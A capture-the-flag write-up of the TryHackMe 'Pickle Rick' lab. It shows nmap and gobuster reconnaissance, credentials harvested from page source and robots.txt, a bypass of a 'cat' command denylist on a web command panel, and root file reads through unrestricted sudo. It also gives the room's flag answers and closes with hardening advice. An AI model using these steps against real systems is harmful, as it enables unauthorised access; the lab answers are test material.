# TryHackMe: Pickle Rick — CTF Writeup

- **Target Platform:** TryHackMe  
- **Room Link:** [Pickle Rick](https://tryhackme.com/room/picklerick)  
- **Difficulty:** Easy  
- **Focus Areas:** Web Reconnaissance, Source Code Auditing, Command Injection Filter Bypass, Privilege Escalation  

---

## 1. Initial Reconnaissance & Scanning

We start by running an initial Nmap scan to identify accessible network services on the target machine.

```bash
nmap -sC -sV -oN nmap_pickle.txt <TARGET_IP>
```

### Key Findings
- **Port 22/tcp (SSH):** Open (OpenSSH).
- **Port 80/tcp (HTTP):** Open (Apache httpd).

---

## 2. Web Reconnaissance & Credential Extraction

Navigating to `http://<TARGET_IP>/` presents the default landing page. 

### Source Code Inspection
Viewing the page source (`Ctrl + U`) reveals a developer note containing a potential username:

```html
<!-- Note to self: remember username! username: R1ckRul3s -->
```

* **Discovered Username:** `R1ckRul3s`

### Checking Standard Artifacts
Next, we check `http://<TARGET_IP>/robots.txt` for crawler disallow rules or exposed strings:

```text
Wubbalubbadubdub
```

* **Discovered Value:** `Wubbalubbadubdub` (potential password/token).

---

## 3. Directory Enumeration with Gobuster

We run Gobuster in directory mode, appending common file extensions (`.php`, `.html`, `.txt`) to uncover hidden pages:

```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Notable Discoveries
- `/login.php` (Status: 200) — Authentication portal.
- `/portal.php` (Status: 302) — Restriced command panel redirecting unauthenticated users.
- `/robots.txt` (Status: 200) — Crawling policy file.

---

## 4. Exploitation & First Ingredient

### Authenticating to the Admin Portal
Navigating to `http://<TARGET_IP>/login.php`, we input the credentials collected during recon:

- **Username:** `R1ckRul3s`
- **Password:** `Wubbalubbadubdub`

Authentication succeeds, redirecting us to the **Command Panel** (`portal.php`), which executes arbitrary bash commands on the server.

### Bypassing Command Filters
Listing directory contents:
```bash
ls -la
```

The output reveals:
- `Sup3rS3cretPickl3Ingred.txt`
- `clue.txt`
- `portal.php`

Attempting to read `Sup3rS3cretPickl3Ingred.txt` using `cat` yields an error:
> `Command disabled to make it harder for future failures!`

The backend applies a denylist filtering the keyword `cat`. We can bypass this by using alternative text-reading utilities like `less`, `head`, `tail`, `strings`, or `base64`.

**Executing with `less`:**
```bash
less Sup3rS3cretPickl3Ingred.txt
```

* **Ingredient 1:** `mr. meeseek hair`

Reading `clue.txt`:
```bash
less clue.txt
```
> *"Look around the file system for the other ingredient."*

---

## 5. File System Enumeration (Second Ingredient)

Since we cannot navigate interactively with `cd`, we inspect the home directory structure directly using absolute paths:

```bash
ls -la /home
ls -la /home/rick
```

Inside Rick's home directory, we locate a file named `second ingredients`:

```bash
less "/home/rick/second ingredients"
```

* **Ingredient 2:** `1 jerry tear`

---

## 6. Privilege Escalation (Third Ingredient)

We check sudo permissions for the current web server user (`www-data`):

```bash
sudo -l
```

### Output:
```text
User www-data may run the following commands on target:
    (ALL) NOPASSWD: ALL
```

`www-data` possesses unrestricted `sudo` execution permissions without requiring a password.

We list the `/root` directory using root privileges:
```bash
sudo ls -la /root
```

We find `3rd.txt` located in `/root`. We read it with elevated privileges:
```bash
sudo less /root/3rd.txt
```

* **Ingredient 3:** `fleeb juice`

---

## 7. Flag Summary

| Flag # | Challenge Question | Flag Value |
| :--- | :--- | :--- |
| **01** | First Ingredient | `mr. meeseek hair` |
| **02** | Second Ingredient | `1 jerry tear` |
| **03** | Final Ingredient | `fleeb juice` |

---

## 8. Remediation & Hardening Notes

1. **Remove Credentials from Source Code:** Comments containing usernames or deployment credentials should never be deployed to production web roots.
2. **Harden `robots.txt` Usage:** Do not use `robots.txt` to store internal secrets, credentials, or flags.
3. **Avoid Command Execution Endpoints:** Dynamic command panels passing input directly to system execution wrappers (`system()`, `exec()`, `shell_exec()`) represent severe Remote Code Execution (RCE) flaws.
4. **Enforce Least Privilege in `sudoers`:** Service accounts like `www-data` should never have `(ALL) NOPASSWD: ALL` access. Restrict permissions strictly to essential binaries.
